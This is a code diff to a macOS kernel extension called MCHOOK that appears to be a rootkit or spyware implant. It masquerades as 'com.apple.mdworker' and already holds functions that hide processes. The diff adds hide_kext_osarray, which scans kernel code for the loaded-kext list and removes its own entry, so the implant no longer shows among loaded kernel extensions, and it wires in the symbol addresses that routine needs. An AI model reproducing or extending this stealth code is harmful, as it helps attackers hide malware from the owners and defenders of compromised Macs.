@@ -48,7 +48,7 @@
 #define OSAX          "appleOsax"
 #define KERNEL_BASE   0xffffff8000200000 // SL 10.6.4
 
-/*#define DEBUG*/
+#define DEBUG
 
 #pragma mark -
 #pragma mark Global variables
@@ -137,14 +137,9 @@ static int cdev_ioctl(dev_t dev,
       printf("[MCHOOK] MCHOOK_HIDEK called\n");
 #endif
       
-      if (g_symbols_resolved == 1) {
-        // TODO: Hide KEXT is unstable
-        
-        if (g_os_major == 10 && g_os_minor == 5) {
-#ifdef DEBUG
-          printf("[MCHOOK] Not hiding kext for leopard, unstable\n");
-#endif
-          
+      if (g_symbols_resolved == 1) {        
+        if (g_os_major == 10 && g_os_minor > 5) {
+          hide_kext_osarray();
           //hide_kext_leopard();
         }
         else {
@@ -356,6 +351,19 @@ static int cdev_ioctl(dev_t dev,
 #endif
           i_proc_list_unlock = (void *)syms->address;
         } break;
+        
+        case KEXT_LOOKUP_WITH_TAG: {
+#ifdef DEBUG
+          printf("[MCHOOK] kext_lookup_with_tag symbol received\n");
+#endif
+          kext_lookup_with_tag = (int *)syms->address;
+        } break;
+        case IO_RECURSIVE_LOCK: {
+#ifdef DEBUG
+          printf("[MCHOOK] io_recursive_log symbol received\n");
+#endif
+          io_recursive_log = (int *)syms->address;
+        } break; 
         default: {
 #ifdef DEBUG
           printf("[MCHOOK] symbol not supported yet\n");
@@ -447,6 +455,18 @@ static int cdev_ioctl(dev_t dev,
           printf("[MCHOOK] proc_list_unlock symbol received\n");
 #endif
           i_proc_list_unlock = (void *)syms->address;
+        } break;
+        case KEXT_LOOKUP_WITH_TAG: {
+#ifdef DEBUG
+          printf("[MCHOOK] kext_lookup_with_tag symbol received\n");
+#endif
+          kext_lookup_with_tag = (int *)syms->address;
+        } break;
+        case IO_RECURSIVE_LOCK: {
+#ifdef DEBUG
+          printf("[MCHOOK] io_recursive_log symbol received\n");
+#endif
+          io_recursive_log = (int *)syms->address;
         } break;
         default: {
 #ifdef DEBUG
@@ -1509,6 +1529,111 @@ int unhide_all_procs()
   return 0;
 }
 
+
+// TODO: 
+// - replace ugly casts with a nice-looking struct
+// - could be wise to acquire sKextLock
+void hide_kext_osarray()
+{
+  unsigned char *code = (unsigned char *)kext_lookup_with_tag;
+
+  if (g_kext_hidden != 0) {
+#ifdef DEBUG
+    printf("[MCHOOK] Kext already hidden\n");
+    return;
+#endif
+  }
+#ifdef DEBUG
+    printf("[MCHOOK] Scanning for sLoadedKexts from %p\n", code);
+#endif
+
+  for (int i=0; i<0x50; i++) {
+    if (code[i] == 0xe8) { // \xe8 == CALL NEAR
+      // displacement, as well as sizeof(int), is 32bit on both x86 and x64
+      unsigned int *displacement = (unsigned int *)&code[i+1];
+      
+      // sanity check, must point to a function prolog, \x55 is push [R|E]BP,
+      // CALL NEAR is 5 bytes on both x86 and x64
+      if (code[i+*displacement+5] == 0x55 ) {
+        unsigned char *instruction = &code[i+5]; // skip to next instruction
+
+#ifdef __LP64__
+        // 0x48   is 64bit prefix
+        // 0xx8b  is RIP relative MOV opcode
+        // 5      is size of call instruction 
+        // 7      size of MOV
+        // 3      is offset of to displacement from MOV opcode
+
+        if (*(unsigned short *)instruction == 0x8b48) {
+          unsigned int _sLoadedKextDisplacement = *(unsigned int *)(instruction+3);
+          _sLoadedKext = (char *)*(unsigned long *)((code + i + 5 + 7) + _sLoadedKextDisplacement);                   
+          break;
+        }
+#else
+        // on x86 we cannot rely on the single opcode 'cuz it's register-specific,
+        // we could check for all the possible opcodes or just don't care
+        _sLoadedKext = (unsigned char *)**(unsigned long **)(instruction+1);
+#ifdef DEBUG
+        printf("[MCHOOK] _sLoadedKext @ %08x\n", (unsigned int)_sLoadedKext);
+#endif        
+        break;
+#endif 
+      }
+    } 
+  }
+  if (_sLoadedKext == NULL) {
+#ifdef DEBUG
+    printf("[MCHOOK] Cannot find _sLoadedKext!!!!!!\n");
+#endif
+    return;
+  }
+
+  unsigned int *kextsCount = (unsigned int *)&_sLoadedKext[OFFT_KEXT_COUNT];
+#ifdef DEBUG
+  printf("  [MCHOOK] Found _sLoadedKext %lx, with %d loaded count\n", (unsigned long)_sLoadedKext, *kextsCount);
+#endif
+  unsigned long *arrayPtr = (unsigned long *)*(unsigned long *)&_sLoadedKext[OFFT_KEXT_ARRAY];
+  unsigned long *lastKext = (unsigned long *)arrayPtr[*kextsCount - 1];
+  
+  unsigned char *kmod_info = (unsigned char *)(lastKext[OFFT_KEXT_KMOD]);
+  if (!strcmp((char *)&kmod_info[OFFT_KMOD_NAME], "com.apple.mdworker"))
+    {
+        // if we're still the last loaded kext, 
+        // then yeah, it's *that* easy
+#ifdef DEBUG
+        printf("[MCHOOK] mdworker is the last kext, decrementing OSArray counter\n");
+#endif
+        _sLoadedKext[OFFT_KEXT_COUNT]--;
+        g_kext_hidden = 1;
+    }
+  else
+    {
+      // we're no moar the last loaded kext, we must
+      // exchange a pointer then
+#ifdef DEBUG
+      printf("[MCHOOK] Not last kext, exchaning pointers with: %s\n", (char *)&kmod_info[OFFT_KMOD_NAME]);
+#endif
+      for (unsigned int i = 0; i<*kextsCount; i++)
+        {
+          lastKext = (unsigned long *)arrayPtr[i];
+          kmod_info = (unsigned char *)(lastKext[OFFT_KEXT_KMOD]);
+          
+          if (!strcmp((char *)&kmod_info[OFFT_KMOD_NAME], "com.apple.mdworker"))
+            {
+              arrayPtr[i] = arrayPtr[*kextsCount -1];
+              _sLoadedKext[OFFT_KEXT_COUNT]--;
+              
+              g_kext_hidden = 1;
+              break;
+            }
+        }
+    }
+    
+    return;
+}
+
+
+// this is not used anymoar
 void hide_kext_leopard()
 {
   kmod_info_t *k, *prev_k;
